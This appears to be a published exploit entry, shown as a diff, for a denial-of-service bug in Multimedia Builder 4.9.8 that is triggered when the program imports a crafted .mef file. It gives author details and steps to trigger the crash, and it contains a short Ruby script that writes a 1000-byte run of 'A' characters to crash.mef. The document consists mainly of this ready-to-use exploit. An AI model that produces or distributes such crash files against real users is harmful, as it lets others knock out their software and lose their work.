@@ -1,0 +1,23 @@
+Multimedia Builder 4.9.8 Malicious mef File Denial of service
+===================================================================================
+# Exploit Title:Multimedia Builder 4.9.8 Malicious mef File Denial of service
+# Author: Ahmed Elhady Mohamed
+# Email : ahmed.elhady.mohamed@gmail.com
+# Website: www.infosec4all.tk
+# version: 4.9.8
+# Category: DOS
+# Tested on: windows XP SP3
+===================================================================================
+########################################DESC####################################################
+#Multimedia Builder 4.9.8 Malicious mef File Denial of service vulnerability ,when opening a   #
+#malicious .mef file.                                                                          #
+#To trigger the exploit , go to file->MEF Import ->load MEF                                    #                                                               #
+################################################################################################
+ 
+#!/usr/bin/ruby
+
+File.open "crash.mef" , "w" do |file|
+
+crash = "\x41" * 1000
+file.write crash
+end
